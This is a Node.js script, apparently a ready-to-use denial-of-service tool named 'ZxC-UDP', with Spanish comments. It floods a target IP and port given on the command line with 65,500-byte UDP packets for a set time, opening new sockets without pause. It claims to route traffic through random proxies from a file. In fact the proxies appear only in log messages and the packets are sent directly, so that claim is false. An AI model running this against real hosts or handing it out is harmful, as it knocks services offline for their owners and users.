const dgram = require('dgram');
const random = require('crypto');
const { performance } = require('perf_hooks');
const fs = require('fs');

function readProxies(file) {
    const proxies = fs.readFileSync(file, 'utf-8').trim().split('\n');
    return proxies.map(proxy => {
        const [ip, port] = proxy.split(':');
        return { ip, port: parseInt(port, 10) };
    });
}

function getRandomProxy(proxies) {
    const randomIndex = Math.floor(Math.random() * proxies.length);
    return proxies[randomIndex];
}

function createSockets(targetIp, targetPort, duration, proxies) {
    const sock = dgram.createSocket('udp4');
    const bytes = random.randomBytes(65500); // Tamaño de paquete de 65500 bytes
    let startTime = performance.now();

    function sendPackets() {
        if (duration > 0 && (performance.now() - startTime) / 1000 >= duration) {
            console.log(`Socket done from: ${sock.address().address}:${sock.address().port}`);
            sock.close();
            return;
        }

        // Seleccionar un proxy aleatorio
        const proxy = getRandomProxy(proxies);
        
        // Enviar el paquete UDP
        sock.send(bytes, 0, bytes.length, targetPort, targetIp, (err) => {
            if (err) {
                console.error(`Error sending packet from ${proxy.ip}:${proxy.port} - ${err.message}`);
            }
        });

        // Continuar enviando paquetes rápidamente
        setImmediate(sendPackets);
    }

    // Iniciar el envío de paquetes
    sendPackets();
}

function UDPFlood(targetIp, targetPort, proxies, duration) {
    console.log(`ZxC-UDP: Attacking ${targetIp}:${targetPort} for ${duration} seconds using proxies`);

    // Continuar usando proxies aleatorias
    const interval = setInterval(() => {
        createSockets(targetIp, targetPort, duration, proxies);
    }, 0); // Sin retraso entre cada nuevo socket

    // Parar el envío de sockets después del tiempo especificado
    setTimeout(() => {
        clearInterval(interval);
        console.log('Attack completed.');
    }, duration * 1000);
}

// Verificación de argumentos desde la línea de comandos
if (process.argv.length !== 5) {
    console.error('Usage: node udp.js <target_ip> <target_port> <time>');
    process.exit(1);
}

const targetIp = process.argv[2];       // IP del objetivo
const targetPort = parseInt(process.argv[3], 10); // Puerto del objetivo
const duration = parseInt(process.argv[4], 10);   // Tiempo de duración

// Usar proxies del archivo por defecto
const proxiesFile = 'proxies.txt'; // Archivo de proxies por defecto
const proxies = readProxies(proxiesFile);

// Llamar a la función para iniciar el ataque
UDPFlood(targetIp, targetPort, proxies, duration);